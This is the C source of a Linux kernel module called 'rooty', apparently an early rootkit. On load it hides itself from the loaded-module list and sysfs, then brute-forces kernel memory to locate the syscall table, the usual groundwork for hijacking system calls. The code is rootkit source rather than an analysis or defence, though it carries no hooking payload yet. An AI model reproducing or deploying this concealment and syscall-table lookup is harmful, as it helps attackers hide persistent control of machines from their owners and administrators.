#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/unistd.h>
#include <linux/syscalls.h>

/* This is a "driver template". It requires:
 * MODULE_LICENSE();
 * module_init();
 * module_exit();
 *
 * It will allow us to load a kernel module, we're naming it `rooty`
 */

MODULE_LICENSE("GPL");
int rooty_init(void);
void rooty_exit(void);
module_init(rooty_init);
module_exit(rooty_exit);

/* Define memory ranges where we might find syscall table */
#if defined(__i386__)
#define START_CHECK 0xc0000000
#define END_CHECK 0xd0000000
typedef unsigned int psize; // Type alias `psize` for `unsigned int` in 32bit case
#else
#define START_CHECK 0xffffffff81000000
#define END_CHECK 0xffffffffa2000000
typedef unsigned long psize; // Type alias `psize` for `unsigned long` in 64bit case
#endif

/* Brute force memory range to find syscall table */
psize *sys_call_table;
psize **find(void) { // find(void) returns ptr->ptr->psize
	psize **sctable; // **sctable is ptr->ptr->psize
	psize i = START_CHECK;
	while (i < END_CHECK) {
		sctable = (psize **) i;
		if (sctable[__NR_close] == (psize *) sys_close) { // Don't capitalise __NR_`close` if you don't want to spend hours debugging #facepalm
			return &sctable[0];
		}
		i += sizeof(void *);
	}
	return NULL;
}

/* Load function print
 * printk() ``The kernel print function, printk(), behaves almost identically  * to the C library printf() function.``
 * Prints to kernel ring buffer
 */
int rooty_init(void) {
	list_del_init(&__this_module.list);
	kobject_del(&THIS_MODULE->mkobj.kobj);  /*Hide from list*/
	printk("rooty: module loaded\n");
	/* Find the syscall table address */
	if ((sys_call_table = (psize *) find())) {
		printk("rooty: sys_call_table found at %p\n", sys_call_table);
	} else {
		printk("rooty: sys_call_table not found\n");
	}
	return 0;
}

/* Exit function print */
void rooty_exit(void) {
	printk("rooty: module removed\n");
}